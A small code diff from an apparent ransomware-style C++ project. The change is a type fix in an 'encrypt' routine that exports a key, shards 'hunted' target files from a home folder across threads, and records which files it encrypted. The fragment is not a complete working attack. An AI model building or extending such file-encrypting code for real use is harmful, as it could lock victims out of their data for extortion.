@@ -129,7 +129,7 @@ std::vector<fs::path> cryptor::Main::encrypt(const fs::path& homeFolder, const s
 	cryptorEngine.exportKey(encryptionKeyPath);
 
 	//Shard the targets vector x ways
-	std::map<uint32_t, std::vector<fs::path>> shards = common::utils::Container::shardVector(hunter.getTargets(), common::Settings::ENCRYPTION_THREADS);
+	std::map<size_t, std::vector<fs::path>> shards = common::utils::Container::shardVector(hunter.getTargets(), common::Settings::ENCRYPTION_THREADS);
 
 	//Create vectors to store the lists of successfully and unsuccessfully encrypted files
 	std::vector<fs::path> successfullyEncrypted = {};
